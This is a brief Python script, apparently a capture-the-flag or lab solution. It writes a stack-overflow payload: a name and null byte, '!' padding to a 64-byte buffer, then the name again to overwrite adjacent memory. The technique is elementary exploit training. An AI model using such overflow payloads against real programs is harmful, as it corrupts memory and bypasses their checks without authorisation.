from struct import pack
import sys

NAME        = b"xaq7pj"
BUFFER_SIZE = 64

p  = NAME + b"\x00" 
p += b"!" * (BUFFER_SIZE - len(NAME) - 1)
p += NAME + b"\x00"
p += b"\n"

sys.stdout.buffer.write(p)
